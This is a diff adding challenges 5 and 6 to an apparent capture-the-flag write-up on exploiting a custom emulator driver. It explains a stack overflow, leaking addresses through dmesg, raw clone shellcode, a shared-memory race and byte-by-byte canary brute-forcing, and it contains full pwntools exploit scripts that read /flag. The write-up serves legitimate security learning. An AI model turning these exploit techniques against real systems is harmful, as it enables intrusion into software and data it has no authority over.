@@ -844,6 +844,481 @@ def main():
 
 ## Challenge 5
 
+This stage is similar to 3, but this time a whole new process, not thread, handles every new connection - one at a time. This means no new connection would be accepted, until the preceding child process have terminated (or sent some signal). Since the mapping was initialized via `MAP_SHARED`, the `mmap`'ed regions are STILL being shared.\
+Moreover, `load_program` handler now loads the program to a process stack buffer, which is a total of size `256 * 16`. However, notice that since we can supply up to index `16`, theres a buffer overflow vuln here, as we can reach a total offset of `48 * 16 * 16`. In addition, this buffer seems uninitialized prior to calling `load_program` - hence we are able to leak its content, writing it to some `mmap`ed region. By carefully designing the yancode for this stage, we can easily write these bytes to some output file, having large stack leakage of our wish (including the stack's canary). \
+Interestingly, according to `checksec`, the binary has an executable stack. This means that we can store our shellcode there, and to return into it. There's actually other good candidates besides the process's stack to store our shellcode at - all we have to obtain is a libc leakage. By doing so, we actually fallback to challenge 2 - where we could execute our desired shellcode, which included the `fork` syscall (this time we'll have to use `clone`, which is actually more generic). \
+In order to obtain leaks, my first idea was to use the fact that the array in which `load_buffer` is being read to, is uninitialized. This means we can load uninitialized content as yancode into the kernel. My idea was to craft special leaking-yancode, that would read its own data and emit it to some file. However, after developing such code, I've noticed I'm only leaking kernel addresses for some reason. The reason behind this is simple - the loadead uninitalized bytes within `load_program` are being loaded to the emulator's code segment, not memory. Apparently there's another vuln within the driver, where the memory of the emulator isn't initialized either, hence we can leak kernel addresses.
+
+```bash
+$ hexdump -C LEAK
+00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000010  00 50 08 00 00 c9 ff ff  00 f0 ff 00 00 3d 00 00  |.P...........=..|
+00000020  00 12 74 7c 80 88 ff ff  00 00 00 00 00 00 00 00  |..t|............|
+```
+
+But this isn't what I need. Instead, a much simpler approach to leak userspace addresses is to just crash a client program, and parsing `dmesg`:
+
+```bash
+[ 1091.739420] traps: toddlersys_leve[268] general protection fault ip:5604763c672f sp:7ffe9374fa18 error:0 in toddlersys_level5.0[5604763c5000+3000]
+```
+
+Another option is to read off `/dev/kmsg`. 
+
+After obtaining the `ip, sp` leaks, we can easily craft userspace shellcode within another process, that mimics challenge-2 behavior using `clone`. I've created a small C program that all it does is calling `fork`, and `strace`d it:
+
+```bash
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7efdf9343a10)
+```
+
+We learn the `fork` glibc wrapper actually uses the `clone` sycall under the hood. By inspecting its disassembly, I've noted that near its start, it does the following:
+
+```bash
+0x7fabf1d67f1c <__libc_fork+44>:     mov    r9,QWORD PTR fs:0x10
+0x7fabf1d67f25 <__libc_fork+53>:     xor    r8d,r8d                                                                   
+0x7fabf1d67f28 <__libc_fork+56>:     lea    r10,[r9+0x2d0]                                                            
+0x7fabf1d67f2f <__libc_fork+63>:     xor    edx,edx                                                                   
+0x7fabf1d67f31 <__libc_fork+65>:     xor    esi,esi
+0x7fabf1d67f33 <__libc_fork+67>:     mov    edi,0x1200011
+0x7fabf1d67f38 <__libc_fork+72>:     mov    eax,0x38
+0x7fabf1d67f3d <__libc_fork+77>:     syscall
+```
+
+Or by inspecting `glibc-2.31` sources, the inlived function `arch_fork`:
+
+```c
+static inline pid_t
+arch_fork (void *ctid)
+{
+  const int flags = CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD;
+  long int ret;
+#ifdef __ASSUME_CLONE_BACKWARDS
+# ifdef INLINE_CLONE_SYSCALL
+  ret = INLINE_CLONE_SYSCALL (flags, 0, NULL, 0, ctid);
+}
+```
+
+This means the flags values is actually `0x1200011`, both `newsp, parent_tid` are set to `NULL`, and `tid = 0`. \
+The only interesting caveat is figuring out how `child_tid`, the address within the TLS that contains the `tid` of a process, is located. But it is a known, constant offset within `fsbase`. Hence, all I did in my shellcode is to mimic `fork`'s behavior. Indeed, now a new process is correctly spawned. 
+
+```python
+#!/bin/python
+
+from glob import glob
+from dataclasses import dataclass
+from subprocess import check_output
+from tempfile import TemporaryFile
+from pwn import *
+import os, sys
+import struct
+import time
+import shutil
+import binascii
+import signal
+import array
+import textwrap
+import string
+import logging
+BINARY = '/challenge/toddlersys_level5.0'
+GDB_SCRIPT= '''
+set follow-fork-mode child
+set print elements 0
+handle SIG33 nostop noprint
+
+c
+'''
+
+context.arch = 'amd64'
+context.terminal = '/usr/bin/tmux'
+binary = ELF(BINARY)
+MAX_YANCODE_SIZE = 0x1000
+
+
+@dataclass
+class Regs:
+    a = b'\x20'
+    b = b'\x08'
+    c = b'\x02'
+    d = b''
+    s = b''
+    i = b''
+    f = b''
+
+@dataclass
+class Opcodes:
+    STM = b'\x01'
+    IMM = b'\x40'
+    ADD = b''
+    CMP = b'\x08'
+    JMP = b''
+    LDM = b''
+    STK = b''
+    SYSCALL = b'\x10'
+
+@dataclass
+class Syscalls:
+    OPEN = b'\x10'
+    READ_CODE = b''
+    READ_MEM = b'\x04'
+    WRITE_MEM = b'\x01'
+    SLEEP = b''
+    EXIT = b''
+
+def instruction(opcode, reg1, reg2):
+    return opcode + reg1 + reg2
+
+def compare(reg1, reg2):
+    buffer = b''
+    buffer += instruction(Opcodes.CMP, reg1, reg2)
+    return buffer
+
+def syscall(number, out_reg):
+    return instruction(Opcodes.SYSCALL, number, out_reg)
+
+def store_in_memory(addr, register):
+    return instruction(Opcodes.STM, addr, register)
+
+def load_from_memory(addr, register):
+    return instruction(Opcodes.LDM, addr, value)
+
+def write_register(register, value):
+    assert(value < 0x100)
+    return instruction(Opcodes.IMM, register, value.to_bytes(1, 'little'))
+
+def jump_register(register, flags):
+    buffer = b''
+    buffer += instruction(Opcodes.JMP, flags, register)
+    return buffer
+
+def jump(addr, flags):
+    buffer = b''
+    buffer += write_register(Regs.s, addr)
+    buffer += jump_register(Regs.s, flags)
+    return buffer
+
+def open_file(file_addr, flags=0, mode=0):
+    buffer = b''
+    buffer += write_register(register=Regs.a, value=file_addr)
+    buffer += write_register(register=Regs.b, value=flags)  # O_RDONLY = 0 ; O_RDWR = 2
+    buffer += write_register(register=Regs.c, value=mode)  # mode, Irrelevant
+    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
+    return buffer
+
+def read_to_memory(fd, offset, count, adjusted=False):
+    buffer = b''
+    if type(fd) == int:
+        buffer += write_register(Regs.a, value=fd)
+    buffer += write_register(Regs.b, value=offset)
+    buffer += write_register(Regs.c, value=count)
+    if adjusted:
+        buffer += instruction(Opcodes.IMM, Syscalls.READ_MEM, Regs.a)
+    else:
+        buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
+    return buffer
+
+def write_from_memory(fd, offset, count):
+    buffer = b''
+    if type(fd) == int:
+        buffer += write_register(Regs.a, value=fd)
+    buffer += write_register(Regs.b, value=offset)
+    buffer += write_register(Regs.c, value=count)
+    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
+    return buffer
+
+def store_string(addr, string):
+    assert(type(string) == bytes)
+    buffer = b''
+    for i, b in enumerate(string):
+        buffer += write_register(Regs.a, b)
+        buffer += write_register(Regs.b, addr + i)
+        buffer += store_in_memory(addr=Regs.b, register=Regs.a)
+    return buffer
+
+def gen_yancode(adjusted=False):
+    flag_path = b'/flag\x00'
+    flag_addr = 0
+    flag_content_addr = flag_addr + len(flag_path)
+    max_size = 0x80
+    out_file_path = b'/home/hacker/OUT\x00'
+    out_file_addr = max_size
+    
+    with open(out_file_path[:-1], 'wb') as f:
+        pass
+
+    yancode = b''
+    # Store "flag" in mem[0]
+    yancode += store_string(addr=flag_addr, string=flag_path)
+    # open("/flag", O_RDONLY, 0)
+    yancode += open_file(file_addr=flag_addr)
+    # read(fd, &mem[0], 0x50)
+    yancode += read_to_memory(fd=Regs.a, offset=flag_content_addr, count=max_size, adjusted=adjusted)
+
+    # Store out filename in mem[0x80]
+    yancode += store_string(addr=out_file_addr, string=out_file_path)
+    yancode += open_file(file_addr=out_file_addr, flags=2)
+    yancode += write_from_memory(fd=Regs.a, offset=flag_content_addr, count=max_size)
+    
+    yancode += b'\x00' * (MAX_YANCODE_SIZE - len(yancode))
+    return yancode
+
+
+SHELLCODE = '''
+read_mmap:
+mov rbx, {0}
+mov rcx, [rbx]
+mov [rip + saved_mmap_addr], rcx
+
+do_clone:
+mov r9, QWORD PTR fs:0x10
+xor r8, r8
+lea r10, [r9 + 0x2d0]
+xor rdx, rdx
+xor rsi, rsi
+mov rdi, 0x1200011
+mov rax, 56
+syscall
+cmp rax, 0
+jne parent
+
+child:
+mov rbx, [rip + saved_mmap_addr]
+add rbx, 72
+mov cl, {1}
+mov dl, {2}
+
+race_loop:
+mov byte ptr [rbx], cl
+mov byte ptr [rbx], dl
+jmp race_loop
+
+parent:
+
+ioctl_loop:
+mov rdi, 4
+mov rsi, 1337
+mov rax, 16
+syscall
+jmp ioctl_loop
+
+saved_mmap_addr:
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+'''
+
+def load_program(p, program_index, yancode):
+    buf = b'load_program '
+    buf += str(program_index).encode() + b' '
+    p.send(buf)
+    p.send(yancode)
+
+def init_ypu(p, ypu_index, program_index, batch=1):
+    buf = b'init_ypu '
+    buf += str(ypu_index).encode() + b' '
+    buf += str(program_index).encode() + b' '
+    buf *= batch
+    p.send(buf)
+
+def run_ypu(p, ypu_index, batch=1):
+    buf = b'run_ypu '
+    buf += str(ypu_index).encode() + b' '
+    buf *= batch
+    p.send(buf)
+
+def quit(p):
+    buf = b'quit '
+    p.send(buf)
+
+def get_leaks():
+    r0 = remote('localhost', 1337)
+    crash_program = 15
+    crashing_yancode = b'A' * MAX_YANCODE_SIZE
+    load_program(r0, crash_program, crashing_yancode)
+    quit(r0)
+
+    dmesg = process('dmesg | grep traps | tail -n 1', shell=True)
+    dmesg.recvuntil(b'ip:')
+    ip_leak = int(dmesg.recvuntil(b' '), 16)
+    dmesg.recvuntil(b'sp:')
+    sp_leak = int(dmesg.recvuntil(b' '), 16)
+    dmesg.kill()
+
+    log.info(f'ip_leak: {hex(ip_leak)} sp_leak: {hex(sp_leak)}')
+    return ip_leak, sp_leak
+
+def main():    
+    p = process(BINARY)
+    input("Press enter to start..")
+    log.info("Exploit starts!")
+ 
+    ip_leak, sp_leak = get_leaks()
+    pie_base = ip_leak - 0x172f
+    log.info(f'pie_base: {hex(pie_base)}')
+    assert(pie_base & 0xfff == 0)
+    
+    r1 = remote('localhost', 1337)
+    input("Press enter to load yancode to mmap'ed buffer..")
+    yancode_program = 0
+    yancode = gen_yancode()
+    load_program(r1, yancode_program, yancode)
+
+    target_ypu = 0
+    init_ypu(r1, target_ypu, yancode_program)
+
+    input("Press enter to load and execute shellcode..")
+    ypu_0_mmap_addr = pie_base + binary.symbols['data'] + 8
+    log.info(f'ypu_0_mmap_addr: {hex(ypu_0_mmap_addr)}')
+
+    shellcode_program = 0
+    shellcode = b'\x90' * 0x100
+    shellcode += asm(SHELLCODE.format(ypu_0_mmap_addr, ord(Opcodes.CMP), ord(Opcodes.SYSCALL)))
+    shellcode += b'\x90' * (MAX_YANCODE_SIZE - len(shellcode))
+    load_program(r1, shellcode_program, shellcode)
+
+    shellcode_addr = sp_leak - 0x3008
+    trampoline_program = 15
+    trampoline = p64(shellcode_addr)
+    trampoline *= int(MAX_YANCODE_SIZE / 8)
+    load_program(r1, trampoline_program, trampoline)
+    quit(r1)
+
+    p.interactive()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+## Challenge 6
+
+Similar to before, but now there's a canary. We can just brute-force it - byte after byte. Notice that due to the `read(0, buf, 0x1000)` call, we have to halt between dispatching inputs towards the remote process. \
+Usually we can detect crash criteria due to canary corruption by having `***stack smasing detected***` banner being emitted to `stderr`. However, notice that under the hood, `__stack_chk_fail` actually calls `writev`. Because of the seccomp filter, this results with `Bad Syscall` prompt. We can inspect a generated `dmesg` entry, that describes the crash reason, along with its `pid`. If its `pid` matches the connection we've just launched, we know for sure that stack corruption have occured.
+
+```python
+def leak_canary(pad_size, debug=False):
+    crash_program = 15
+    current = b'A' * pad_size
+
+    # Initialization step, we must create 1 false entry
+    with remote('localhost', 1337) as r:
+        buf = current + b'A' * 8
+        load_program(r, crash_program, buf)
+        time.sleep(0.1)
+        r.sendline(b'quit')
+
+    canary = b''
+    while True:
+        for b in range(256):
+            log.info(f'canary: {canary} b: {b}')
+            with remote('localhost', 1337) as r:
+                candidate = current + b.to_bytes(1, 'little')
+                load_program(r, crash_program, candidate)
+                time.sleep(0.1)
+                with process('pgrep -f challenge | tail -n 2', shell=True) as pgrep:
+                    r_pid = pgrep.readline()[:-1]
+                    r_pid = int(r_pid, 10)
+                r.sendline(b'quit')
+
+                time.sleep(0.2)
+                with process('dmesg | grep /challenge/toddlersys_level | grep audit | tail -n 1', shell=True) as dmesg:
+                    dmesg.recvuntil(b'pid=')
+                    crashed_pid = int(dmesg.recvuntil(b' ')[:-1], 10)
+                    
+                if crashed_pid == r_pid:
+                    continue
+                
+                # Double check
+                with process('dmesg | grep /challenge/toddlersys_level | grep audit | tail -n 1', shell=True) as dmesg:
+                    dmesg.recvuntil(b'pid=')
+                    crashed_pid = int(dmesg.recvuntil(b' ')[:-1], 10)
+                
+                if crashed_pid != r_pid:
+                    log.info(f'NEW BYTE FOUND: {hex(b)}')
+                    canary += b.to_bytes(1, 'little')
+                    current = candidate
+                    if debug:
+                        canary = input('write the canary value\n')
+                        return int(canary, 16)
+                    if len(canary) == 8:
+                        return u64(canary)
+
+
+def get_leaks(canary):
+    with remote('localhost', 1337) as r0:
+        crash_program = 15
+        crashing_yancode = p64(canary)
+        crashing_yancode *= int(MAX_YANCODE_SIZE / 8)
+        load_program(r0, crash_program, crashing_yancode)
+        time.sleep(0.1)
+        quit(r0)
+
+    time.sleep(2)
+
+    with process('dmesg | grep traps | tail -n 1', shell=True) as dmesg:
+        dmesg.recvuntil(b'ip:')
+        ip_leak = int(dmesg.recvuntil(b' '), 16)
+        dmesg.recvuntil(b'sp:')
+        sp_leak = int(dmesg.recvuntil(b' '), 16)
+
+    log.info(f'ip_leak: {hex(ip_leak)} sp_leak: {hex(sp_leak)}')
+    return ip_leak, sp_leak
+
+def main():    
+    p = process(BINARY)
+    input("Press enter to start..")
+    log.info("Exploit starts!")
+
+    pad_size = 0x318
+    canary = leak_canary(pad_size, debug=False)
+    log.info(f'canary: {hex(canary)}')
+
+    ip_leak, sp_leak = get_leaks(canary)
+    pie_base = ip_leak - 0x175d
+    log.info(f'pie_base: {hex(pie_base)}')
+    assert(pie_base & 0xfff == 0)
+    
+
+    r1 = remote('localhost', 1337)   
+    input("Press enter to load yancode to mmap'ed buffer..")
+    yancode_program = 0
+    yancode = gen_yancode()
+    load_program(r1, yancode_program, yancode)
+
+    target_ypu = 0
+    init_ypu(r1, target_ypu, yancode_program)
+
+
+    input("Press enter to load shellcode..")
+    ypu_0_mmap_addr = pie_base + binary.symbols['data'] + 8
+    log.info(f'ypu_0_mmap_addr: {hex(ypu_0_mmap_addr)}')
+
+    shellcode_program = 0
+    shellcode = b'\x90' * 0x100
+    shellcode += asm(SHELLCODE.format(ypu_0_mmap_addr, ord(Opcodes.CMP), ord(Opcodes.SYSCALL)))
+    shellcode += b'\x90' * (MAX_YANCODE_SIZE - len(shellcode))
+    load_program(r1, shellcode_program, shellcode)
+
+    input("Press enter to load trampoline..")
+    shellcode_addr = sp_leak - 0x2fa8
+    trampoline_program = 15
+    trampoline = b'A' * pad_size 
+    trampoline += p64(canary) + p64(shellcode_addr) * 2
+    trampoline += b'B' * (MAX_YANCODE_SIZE - len(trampoline))
+    load_program(r1, trampoline_program, trampoline)
+
+    input("Press enter to jump to shellcode..")
+    quit(r1)
+    
+    p.interactive()
+```
+
+## Challenge 7
+
+
 
 
 
